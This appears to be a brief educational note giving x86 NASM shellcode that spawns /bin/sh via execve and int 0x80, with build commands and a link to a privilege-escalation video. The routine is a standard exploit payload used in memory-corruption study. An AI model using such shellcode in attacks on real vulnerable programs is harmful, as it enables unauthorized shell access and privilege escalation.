# ShellCode

Sample Assembly Code

```nasm
section .text
  global _start

_start:
  xor eax, eax
  push eax
  push 0x68732f2f
  push 0x6e69622f       ; //bin/sh
  mov ebx, esp          ; stack pointer to register
  mov ecx, eax
  mov al, 0xb
  int 0x80
```

Compilation

```shell
nasm -f elf -o shell.o shell.asm
ld -o shell shell.o
```

# Reference
- [Priviledge Escalation](https://www.youtube.com/watch?v=HSlhY4Uy8SA&ab_channel=LiveOverflow)